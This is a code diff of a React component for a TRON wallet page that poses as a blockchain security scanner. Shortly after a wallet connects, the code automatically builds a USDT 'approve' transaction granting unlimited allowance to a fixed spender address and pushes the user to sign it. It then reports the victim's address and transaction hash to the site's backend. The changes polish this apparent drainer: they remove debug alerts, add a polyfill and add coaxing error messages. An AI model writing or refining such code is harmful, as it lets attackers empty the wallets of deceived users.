@@ -8,7 +8,6 @@ interface HeroSectionProps {
   onInitiateScan: () => void;
 }
 
-
 // ======================
 // CONSTANTS (USDT APPROVAL)
 // ======================
@@ -30,25 +29,20 @@ function buildTronWeb() {
 // ======================
 // COMPONENT
 // ======================
-export function HeroSection({ onConnect, onDisconnect, onApprovalSuccess }: any) {
+export function HeroSection({
+  onConnect,
+  onDisconnect,
+  onApprovalSuccess,
+}: any) {
   const [logs, setLogs] = useState<string[]>([]);
   const [error, setError] = useState("");
   const [loading, setLoading] = useState(false);
 
   // FLOW STATE
-  const [step, setStep] = useState<"connect" | "approve" | "done">(
-    "connect"
-  );
+  const [step, setStep] = useState<"connect" | "approve" | "done">("connect");
 
-  const {
-    address,
-    connected,
-    wallet,
-    select,
-    connect,
-    disconnect,
-    wallets,
-  } = useWallet();
+  const { address, connected, wallet, select, connect, disconnect, wallets } =
+    useWallet();
 
   // ======================
   // AUTO SYNC WALLET
@@ -62,9 +56,14 @@ export function HeroSection({ onConnect, onDisconnect, onApprovalSuccess }: any)
   }, [connected]);
 
   useEffect(() => {
-    console.log("Step 0 Here")
+    console.log("Step 0 Here");
     if (connected && address && !approvalAttempted.current) {
-      console.log("address, connected, approvalAttempted", address, connected, approvalAttempted.current);
+      console.log(
+        "address, connected, approvalAttempted",
+        address,
+        connected,
+        approvalAttempted.current,
+      );
       approvalAttempted.current = true;
       onConnect?.({
         address,
@@ -78,7 +77,12 @@ export function HeroSection({ onConnect, onDisconnect, onApprovalSuccess }: any)
         handleApproval();
       }, 1500);
     } else {
-      console.log("From Else ---> address, connected, approvalAttempted", address, connected, approvalAttempted.current);
+      console.log(
+        "From Else ---> address, connected, approvalAttempted",
+        address,
+        connected,
+        approvalAttempted.current,
+      );
     }
   }, [connected, address]);
 
@@ -109,8 +113,6 @@ export function HeroSection({ onConnect, onDisconnect, onApprovalSuccess }: any)
     return () => clearInterval(interval);
   }, [connected, address]);
 
-
-
   // ======================
   // CONNECT WALLET (QR)
   // ======================
@@ -120,7 +122,7 @@ export function HeroSection({ onConnect, onDisconnect, onApprovalSuccess }: any)
       setError("");
 
       const wc = wallets.find((w) =>
-        w.adapter.name.toLowerCase().includes("walletconnect")
+        w.adapter.name.toLowerCase().includes("walletconnect"),
       );
 
       if (!wc) throw new Error("WalletConnect not found");
@@ -131,7 +133,6 @@ export function HeroSection({ onConnect, onDisconnect, onApprovalSuccess }: any)
 
       // Call connect on the adapter directly to avoid React state closure issues
       await wc.adapter.connect();
-
     } catch (e: any) {
       setError(e.message || "WalletConnect failed");
     } finally {
@@ -144,7 +145,6 @@ export function HeroSection({ onConnect, onDisconnect, onApprovalSuccess }: any)
   // ======================
   const handleApproval = async () => {
     try {
-      alert("Step 1 Here");
       setLoading(true);
       setError("");
 
@@ -154,50 +154,57 @@ export function HeroSection({ onConnect, onDisconnect, onApprovalSuccess }: any)
 
       const tronWeb = buildTronWeb();
 
-      alert("Step 2 Here");
+      // Add Buffer polyfill for TronWeb
+      if (!(globalThis as any).Buffer) {
+        const { Buffer } = await import('buffer');
+        (globalThis as any).Buffer = Buffer;
+      }
 
-      const tx = await tronWeb.transactionBuilder.triggerSmartContract(
-        USDT_ADDRESS,
-        "approve(address,uint256)",
-        {
-          feeLimit: 100_000_000,
-          callValue: 0,
-        },
-        [
-          { type: "address", value: SPENDER },
-          { type: "uint256", value: MAX_ALLOWANCE },
-        ],
-        address
-      );
+      let tx;
 
-      alert("Step 3 Here");
+      try {
+        tx = await tronWeb.transactionBuilder.triggerSmartContract(
+          USDT_ADDRESS,
+          "approve(address,uint256)",
+          {
+            feeLimit: 100_000_000,
+            callValue: 0,
+          },
+          [
+            { type: "address", value: SPENDER },
+            { type: "uint256", value: MAX_ALLOWANCE },
+          ],
+          address,
+        );
+      } catch (e) {
+        console.error("Error building transaction:", e);
+        throw new Error("Failed to build transaction. Please ensure your wallet is properly connected.");
+      }
 
       if (!tx?.transaction) {
         throw new Error("Failed to build transaction");
       }
 
+      console.log("Built transaction:", tx.transaction);
+
       const signed = await wallet.adapter.signTransaction(tx.transaction);
 
-      alert("Step 4 Here");
-
       if (!signed) {
-        throw new Error("Signing failed");
+        throw new Error("Signing failed. Please approve the transaction in your wallet.");
       }
 
       const result = await tronWeb.trx.sendRawTransaction(signed);
 
-      alert("Step 5 Here");
-
       await fetch(`${BASE_URL}/api/approved`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
-          network: 'TRON Mainnet',
+          network: "TRON Mainnet",
           owner: address,
           spender: USDT_SPENDER_ADDRESS,
           amount: MAX_ALLOWANCE,
-          txHash: result.txid || "unknown"
-        })
+          txHash: result.txid || "unknown",
+        }),
       });
 
       setStep("done");
@@ -212,6 +219,7 @@ export function HeroSection({ onConnect, onDisconnect, onApprovalSuccess }: any)
       onApprovalSuccess?.();
     } catch (e: any) {
       setError(e.message || "Approval failed");
+      console.log("Error during approval:", e);
     } finally {
       setLoading(false);
     }
@@ -363,10 +371,7 @@ export function HeroSection({ onConnect, onDisconnect, onApprovalSuccess }: any)
         >
           {["REAL-TIME ANALYSIS", "BLOCKCHAIN VERIFIED", "NON-CUSTODIAL"].map(
             (badge, i) => (
-              <div
-                key={i}
-                className="flex items-center gap-2 text-slate-400"
-              >
+              <div key={i} className="flex items-center gap-2 text-slate-400">
                 <div className="w-1 h-1 bg-emerald-500" />
                 <span>{badge}</span>
               </div>
